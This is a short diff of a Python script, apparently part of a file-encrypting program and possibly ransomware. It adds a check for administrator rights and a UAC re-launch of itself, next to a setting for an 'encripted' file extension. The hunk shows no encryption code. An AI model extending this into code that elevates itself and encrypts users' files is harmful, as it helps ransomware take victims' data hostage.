@@ -4,11 +4,18 @@ import psutil
 import sys
 import ctypes
 
-# Change the string to the message you want to display to the user
-message = "This script requires administrative privileges. Please re-run as administrator."
+def es_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
 
-# The UAC (User Account Control) will be shown with the provided message
-ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "/p \"{}\"".format(message), None, 1)
+if es_admin():
+    # El código que se ejecutará como administrador va aquí
+    pass
+else:
+    # Reejecuta el programa con privilegios de administrador
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
 # Extensión para los archivos encriptados.
 extension = 'encripted'
